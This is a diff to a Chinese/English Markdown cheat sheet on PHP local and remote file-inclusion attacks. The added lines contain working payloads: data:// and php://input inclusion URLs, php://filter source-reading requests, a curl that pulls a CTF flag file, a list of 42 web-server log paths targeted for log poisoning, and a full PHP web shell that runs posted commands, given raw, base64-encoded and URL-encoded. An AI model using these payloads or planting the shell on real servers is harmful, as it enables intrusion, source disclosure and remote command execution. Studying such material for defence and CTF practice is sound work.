@@ -161,41 +161,90 @@ allow_url_include=On 就是远程文件包含，Off就是本地文件包含
 * php 自带协议
 
 
-data://
+** data:// **
 
-> php5.0以下 和 php5.2 版本有效,allow_url_include=On
+Streams can be used with functions such as file_get_contents, fopen, include and require etc. and this is where the danger of Remote and Local file inclusion occur
+
+> php>5.2 ,allow_url_include=On
 
 ```
-file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
+# base64 decode is 'I love PHP\n'
+echo file_get_contents('data://text/plain;base64,SSBsb3ZlIFBIUAo=');
+
+# index.php
+<? include($_GET['file'] . ".php");
+
+# phpinfo
+<? phpinfo(); die();?>
+
+:::php
+// Base64 Encoded
+PD8gcGhwaW5mbygpOyBkaWUoKTs/Pg==
+
+// URL + Base64 Encoded
+PD8gcGhwaW5mbygpOyBkaWUoKTs%2fPg==
+
+// Final URL
+index.php?file=data://text/plain;base64,PD8gcGhwaW5mbygpOyBkaWUoKTs%2fPg==
 ```
 
-php://input -- php的输入流，可以读到没有处理过的POST数据
+gui command shell:
+
+```
+# GUI command shell.
+
+# PHP Payload
+<form action="<?=$_SERVER['REQUEST_URI']?>" method="POST"><input type="text" name="x" value="<?=htmlentities($_POST['x'])?>"><input type="submit" value="cmd"></form><pre><? echo `{$_POST['x']}`; ?></pre><? die(); ?>
+
+# Base64 encoded payload
+
+PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8+IiBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4IiB2YWx1ZT0iPD89aHRtbGVudGl0aWVzKCRfUE9TVFsneCddKT8+Ij48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0+PHByZT48PyAKZWNobyBgeyRfUE9TVFsneCddfWA7ID8+PC9wcmU+PD8gZGllKCk7ID8+Cgo=
+
+# Base64 + URL encoded payload
+PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8%2BIiBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4IiB2YWx1ZT0iPD89aHRtbGVudGl0aWVzKCRfUE9TVFsneCddKT82BIj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0%2BPHByZT48PyAKZWNobyBgeyRfUE9TVFsneCddfWA7ID8%2BPC9wcmU%2BPD8gZGllKCk7ID8%2BCgo%3D
+```
+
+** php://input ** -- php的输入流，可以读到没有处理过的POST数据
 
 >  php5.0以下 和 php5.2 版本有效, allow_url_include=On
 
 
 # firefox hackbar
+
+```
 ?page=php://input
 
 post:
 <?php system('ls');?>
 ```
 
-php://filter -- 利用主要是利用了resource和vonvert，这样可以读取到php的代码。
+** php://filter **-- 利用主要是利用了resource和vonvert，这样可以读取到php的代码。
 
-> php5.0以下 和 php5.2 版本有效
-
-```
-?id=php://filter/convert.base64-encode/resource=test.txt 
-
-?id=php://filter/convert.base64-encode/resource=http://127.0.0.1/test/test.txt
+> php5.0以上
 
 ```
+?url=php://filter/convert.base64-encode/resource=test.txt 
 
-php://fd
+?url=php://filter/convert.base64-encode/resource=http://127.0.0.1/test/test.txt
+```
+
+实战：
+
+```
+$ curl ctf.sharif.edu:31455/chal/technews/634770c075a17b83/images.php?id=php://filter/resource=files/images/robot.jpg/resource=files/flag/flag.txt
+```
+
+** php://fd **
 
 > php 5.3.6中新增加
 
+** glob **
+
+> php>5.3.0
+
+```
+DirectoryIterator(“glob://ext/spl/examples/*.php”)
+```
 
 ## 日记包含高级利用
 
@@ -233,6 +282,53 @@ Host: 192.168.3.44
 ```
 
 你会发现WEB服务器一直不会返回响应，直到我们客户端断开这次连接，这个邪恶的空格便写入了WEB日志！
+
+* Popular log file paths targeted by LFI
+
+```
+1. /etc/httpd/logs/access.log
+2. /etc/httpd/logs/access_log
+3. /etc/httpd/logs/error.log
+4. /etc/httpd/logs/error_log
+5. /opt/lampp/logs/access_log
+6. /usr/local/apache/log
+7. /usr/local/apache/logs/access.log
+8. /usr/local/apache/logs/error.log
+9. /usr/local/etc/httpd/logs/access_log
+10. /usr/local/www/logs/thttpd_log
+11. /var/apache/logs/error_log
+12. /var/log/apache/error.log
+13. /var/log/apache-ssl/error.log
+14. /var/log/httpd/error_log
+15. /var/log/httpsd/ssl_log
+16. /var/www/log/access_log
+17. /var/www/logs/access.log
+18. /var/www/logs/error.log
+19. C:\apache\logs\access.log
+20. C:\Program Files\Apache Group\Apache\logs\access.log
+21. C:\program files\wamp\apache2\logs
+22. C:\wamp\logs
+23. C:\xampp\apache\logs\error.log
+24. /opt/lampp/logs/error_log
+25. /usr/local/apache/logs
+26. /usr/local/apache/logs/access_log
+27. /usr/local/apache/logs/error_log
+28. /usr/local/etc/httpd/logs/error_log
+29. /var/apache/logs/access_log
+30. /var/log/apache/access.log
+31. /var/log/apache-ssl/access.log
+32. /var/log/httpd/access_log
+33. /var/log/httpsd/ssl.access_log
+34. /var/log/thttpd_log
+35. /var/www/log/error_log
+36. /var/www/logs/access_log
+37. /var/www/logs/error_log
+38. C:\apache\logs\error.log
+39. C:\Program Files\Apache Group\Apache\logs\error.log
+40. C:\wamp\apache2\logs
+41. C:\xampp\apache\logs\access.log
+42. proc/self/environ
+```
 
 [3]: http://www.wooyun.org/bugs/wooyun-2011-02236
 
